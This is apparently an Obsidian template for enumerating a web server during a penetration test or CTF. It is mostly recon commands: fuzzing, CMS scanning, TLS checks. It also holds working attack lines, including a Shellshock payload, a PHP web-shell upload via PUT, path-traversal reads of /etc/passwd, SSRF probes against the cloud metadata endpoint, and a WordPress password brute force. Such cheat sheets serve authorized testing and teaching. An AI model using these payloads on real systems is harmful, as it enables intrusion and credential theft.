<%-*
if (tp.frontmatter.current_port == undefined) {
  tp.frontmatter.current_port = await tp.system.prompt('Enter HTTP port number: ')
}
-%>
# HTTP — Port <% tp.frontmatter.current_port %>
<%*
let port = parseInt(tp.frontmatter.current_port)
let ip = tp.frontmatter.target_ip
let domain = tp.frontmatter.domain
let scheme = (port === 443 || port === 8443 || port === 9443) ? 'https' : 'http'
let portSuffix = (port === 80 || port === 443) ? '' : `:${port}`
let url = `${scheme}://${ip}${portSuffix}`
let domainUrl = `${scheme}://${domain}${portSuffix}`
let subFuzz = `${scheme}://FUZZ.${domain}${portSuffix}`
-%>

---

## Quick Checks
```bash
# Add domain to hosts
echo '<% ip %> <% domain %>' | sudo tee -a /etc/hosts
```

```
# URLs
<% url %>
<% domainUrl %>
```

```bash
# Full headers
curl -Isk <% url %>
curl -Isk <% domainUrl %>
```

```bash
# Follow redirects, show final page
curl -Lsk <% url %> | head -100
```

---

## Technology Fingerprinting
```bash
# whatweb — fingerprint CMS, framework, language
whatweb <% url %> -v
whatweb <% domainUrl %> -v
```

```bash
# wappalyzer CLI
wappalyzer <% url %>
```

```bash
# nmap HTTP scripts
nmap -p<% port %> --script=http-headers,http-title,http-server-header,http-methods,http-generator <% ip %>
```

---

## Directory Discovery

### FFuf
```bash
ffuf -u <% url %>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 -mc 200,204,301,302,307,401,403,405
```

```bash
ffuf -u <% domainUrl %>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 -mc 200,204,301,302,307,401,403,405
```

```bash
# Add file extensions
ffuf -u <% url %>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e .php,.asp,.aspx,.jsp,.txt,.bak,.old,.zip,.tar.gz -t 50
```

```bash
# Filter by size (when everything returns 200)
ffuf -u <% url %>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -fs <size>
```

```bash
# Recursive
ffuf -u <% url %>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 3 -t 30
```

### Feroxbuster
```bash
feroxbuster -u <% url %> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 -x php,asp,aspx,jsp,txt,bak
```

```bash
feroxbuster -u <% domainUrl %> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 --depth 3
```

### Gobuster
```bash
gobuster dir -u <% url %> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,asp,aspx,txt
```

---

## Subdomain / VHost Fuzzing

### VHost (most reliable — no DNS needed)
```bash
ffuf -u <% url %> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'HOST: FUZZ.<% domain %>' -mc 200,204,301,302,307 -fs <baseline_size>
```

### Subdomain bruteforce
```bash
gobuster dns -d <% domain %> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -i
```

```bash
ffuf -u <% subFuzz %> -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -mc 200,301,302
```

```bash
dnsx -d <% domain %> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o subdomains.txt
```

---

## CMS Detection & Exploitation

### WordPress
```bash
nmap -p<% port %> --script=http-wordpress-enum,http-wordpress-users <% ip %>
```

```bash
wpscan --url <% url %> --enumerate p,t,u --api-token <TOKEN>
```

```bash
wpscan --url <% url %> -P /usr/share/wordlists/rockyou.txt -U admin
```

```bash
# Check xmlrpc
curl -s -X POST <% url %>/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
```

### Joomla
```bash
joomscan --url <% url %>
```

```bash
nmap -p<% port %> --script=http-joomla-brute <% ip %>
```

### Drupal
```bash
droopescan scan drupal -u <% url %>
```

### Other CMSes
```bash
# CMSeek
cmseek -u <% url %>
```

---

## API Enumeration
```bash
# Common API paths
ffuf -u <% url %>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -mc 200,201,204,401,403
```

```bash
# REST API methods
curl -X OPTIONS <% url %>/api/ -v
for m in GET POST PUT DELETE PATCH; do echo -n "$m: "; curl -s -o /dev/null -w "%{http_code}" -X $m <% url %>/api/; echo; done
```

```bash
# Swagger / OpenAPI discovery
ffuf -u <% url %>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/swagger.txt -mc 200
```

---

## Nikto
```bash
nikto -h <% url %> -o nikto_<% ip %>_<% port %>.txt
```

```bash
nikto -h <% domainUrl %>
```

---

## WAF Detection
```bash
wafw00f <% url %>
```

```bash
nmap -p<% port %> --script=http-waf-detect,http-waf-fingerprint <% ip %>
```

---

## SSL / TLS (HTTPS)
<%* if (scheme === 'https') { -%>
```bash
sslscan <% ip %>:<% port %>
```

```bash
testssl.sh <% ip %>:<% port %>
```

```bash
nmap -p<% port %> --script=ssl-enum-ciphers,ssl-cert,ssl-heartbleed,ssl-poodle <% ip %>
```

```bash
openssl s_client -connect <% ip %>:<% port %> 2>/dev/null | openssl x509 -noout -text
```
<%* } else { -%>
> Port <% port %> is plain HTTP — run HTTPS checks if 443 is also open.
<%* } -%>

---

## Common Vulnerabilities

### Default Credentials
```bash
# Common admin panels
for path in /admin /administrator /wp-admin /phpmyadmin /manager /console /dashboard /login; do
  echo -n "$path: "; curl -so /dev/null -w "%{http_code}" <% url %>$path; echo
done
```

### Shellshock (CGI)
```bash
nmap -p<% port %> --script=http-shellshock --script-args uri=/cgi-bin/status <% ip %>
```

```bash
curl -H "User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'" <% url %>/cgi-bin/status
```

### HTTP Methods (PUT/DELETE)
```bash
nmap -p<% port %> --script=http-methods <% ip %>
```

```bash
# Try uploading a file via PUT
curl -X PUT <% url %>/upload.php -d '<?php system($_GET["cmd"]); ?>'
```

### LFI / Path Traversal Quick Tests
```bash
curl "<% url %>/page?file=../../../../etc/passwd"
curl "<% url %>/page?file=....//....//....//etc/passwd"
curl "<% url %>/page?file=php://filter/convert.base64-encode/resource=/etc/passwd"
```

### SSRF Quick Tests
```bash
curl "<% url %>/fetch?url=http://<% tp.frontmatter.my_ip %>"
curl "<% url %>/image?src=http://169.254.169.254/latest/meta-data/"
```

---

## Interesting Files to Check
```
robots.txt          sitemap.xml        .htaccess
/.git/              /.svn/             /.env
/config.php         /config.yaml       /web.config
/backup.zip         /.DS_Store         /phpinfo.php
/server-status      /server-info       /elmah.axd
/trace.axd          /.well-known/      /crossdomain.xml
```

```bash
for f in robots.txt sitemap.xml .htaccess .git/HEAD .env phpinfo.php config.php backup.zip; do
  echo -n "$f: "; curl -so /dev/null -w "%{http_code}" <% url %>/$f; echo
done
```

---

## Notes
